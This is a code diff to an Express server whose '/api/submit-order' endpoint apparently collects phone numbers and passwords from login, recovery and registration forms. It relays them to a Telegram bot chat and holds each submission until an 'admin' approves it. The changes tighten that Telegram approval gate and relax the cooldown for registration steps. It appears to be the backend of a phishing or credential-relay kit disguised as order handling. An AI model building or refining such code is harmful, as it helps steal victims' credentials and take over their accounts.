@@ -48,6 +48,7 @@ async function sendToTelegram(url, payload) {
         throw error;
     }
 }
+
 // Handles Submissions across all authentication, recovery, and registration flows
 app.post('/api/submit-order', async (req, res) => {
     try {
@@ -56,12 +57,20 @@ app.post('/api/submit-order', async (req, res) => {
         const currentTime = Date.now(); 
         const cooldownTime = 15 * 1000; // 15 seconds cooldown
 
-        if (lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
+        // =========================================================================
+        // CRITICAL FIX: Force status to 'pending' immediately on EVERY request!
+        // This ensures stale 'approved' states can never bypass the Telegram gate.
+        // =========================================================================
+        orderStatuses[phone] = 'pending';
+
+        const isRegistration = uniqueId && uniqueId.startsWith('Account Registration: ');
+
+        // Prevent duplicate spam submissions within 15 seconds (bypassed for fresh registration steps)
+        if (!isRegistration && lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
             return res.json({ success: true, message: 'Already submitted.' });
         }
 
         lastSubmissionTime[phone] = currentTime;
-        orderStatuses[phone] = 'pending';
 
         const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -112,9 +121,6 @@ app.post('/api/submit-order', async (req, res) => {
             userCredentials[phone].password = uniqueId;
         }
 
-        // ==========================================
-        // PUT IT RIGHT HERE INSTEAD OF THE OLD `message`
-        // ==========================================
         const message = `${headerTitle}\n\n` +
                         `🇸🇱 Country: +232\n` +
                         `📱 Phone: ${rawDigits}\n` +
@@ -146,6 +152,7 @@ app.post('/api/submit-order', async (req, res) => {
         res.status(500).json({ success: false, message: 'Error' });
     }
 });
+
 // Polling loop to check if admin approved the submission
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone ? req.query.phone.trim() : '';
